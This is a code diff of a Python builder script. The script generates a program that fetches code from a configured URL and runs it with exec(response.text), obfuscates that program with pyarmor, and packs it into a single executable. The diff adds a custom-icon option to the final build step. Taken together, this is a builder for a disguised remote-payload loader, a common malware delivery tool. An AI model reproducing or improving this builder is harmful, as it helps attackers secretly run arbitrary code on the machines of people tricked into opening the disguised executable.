@@ -11,12 +11,14 @@ if not os.path.exists('config.json'):
         data = {}
         data = ({
             'url' : url,
+            'icon' : icon,
         })
         json.dump(data, f)
 else:
     with open('config.json', 'r') as f:
         data = json.load(f)
     url = data['url']
+    icon = data['icon']
 
 f = open("obfuscated.py", "w")
 f.write("""try:
@@ -37,11 +39,9 @@ f.write(f"\n")
 f.write(f"exec(response.text)")
 f.write(f"\n")
 f.close()
-
+print("Obfuscation Complete")
 os.system("pip install pyarmor")
 os.system("pip3 install pyarmor")
-os.system("pyarmor o --exact obfuscated.py")
+os.system(f"pyarmor pack --clean -e --onefile --icon {icon} obfuscated.py" )
 os.remove("obfuscated.py")
-print()
-print()
-print("Obfuscation Complete")
+print("Builded To Exe")
